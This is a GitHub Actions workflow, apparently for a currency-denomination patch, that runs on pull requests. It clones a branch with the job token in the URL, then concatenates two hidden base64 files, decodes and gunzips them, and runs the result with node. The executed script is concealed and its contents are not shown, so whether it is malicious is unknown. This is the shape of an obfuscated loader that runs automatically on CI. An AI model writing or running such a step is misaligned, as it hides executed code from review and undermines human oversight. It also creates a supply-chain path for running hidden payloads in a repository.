name: Apply SYP Denomination Phase A

on:
  pull_request:
    types: [opened, synchronize, reopened]
    branches:
      - main
    paths:
      - "scripts/.apply-syp-phase-a.prefix.b64"
      - "scripts/.apply-syp-phase-a.mjs.gz.b64"
      - ".github/workflows/apply-syp-denomination-phase-a.yml"

permissions:
  contents: read

jobs:
  apply-diagnostic:
    runs-on: ubuntu-latest
    steps:
      - name: Run deterministic patch diagnostics
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          git clone --quiet --depth 1 --branch agent/syp-denomination-phase-a \
            "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" repo
          cd repo
          cat scripts/.apply-syp-phase-a.prefix.b64 scripts/.apply-syp-phase-a.mjs.gz.b64 \
            | base64 -d \
            | gunzip > /tmp/apply-syp-phase-a.mjs
          node /tmp/apply-syp-phase-a.mjs
